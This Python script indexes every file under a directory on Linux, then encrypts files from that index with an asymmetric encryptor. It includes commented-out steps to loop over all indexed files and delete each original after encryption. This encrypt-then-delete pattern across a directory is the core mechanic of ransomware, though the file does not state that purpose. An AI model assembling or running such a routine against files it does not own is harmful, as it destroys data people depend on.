from platform import system
import os
from indexHandler import IndexHandler
from asencryptor import Asencryptor

class Scanner:
    
    __os = None
    __scan_dir = None
    
    def __init__(self) -> None:
        self.__os = system()
        
    def set_scan_dir(self, dir):
        if os.path.exists(dir): self.__scan_dir = dir
        else: return False
    
    def scan_dir(self, writetoindex_fn):
        if self.__os.lower() == "linux":
            print("Initializin scan !")
            print("Scan starting !")
            result = os.walk(self.__scan_dir)
            files= []
            counter = 0
            print("Scan started !")
            for tpl in result:
                for i in tpl[2]:
                    counter += 1
                    files.append(tpl[0]+"/"+i)
                    print(tpl[0]+"/"+i)
                    writetoindex_fn(tpl[0]+"/"+i, ";")
            print("Scan Finished !")
            print(f'Found {counter} files')
    

ih = IndexHandler()
#ih.create_index("indexfiletest.txt")
#ih.open_index_for_write("indexfiletest.txt")
sc = Scanner()
#sc.set_scan_dir("/home/r3d1/Documents/filestoendec")
#sc.scan_dir(ih.write_to_index)
#ih.close_index()

ih.read_data_from_index("indexfiletest.txt")
data = ih.get_data().split(";")

enc = Asencryptor()
#enc.generate_keys()
#enc.store_keys()
enc.load_keys()
print("Encrypting !!!")
#for i in data[:len(data)-1]:
enc.read_file_data_for_encryption(data[0])
enc.encrypt()
enc.write_file_data_after_encryption()
    #enc.remove_orgfile_after_encryption()
print("Done !")
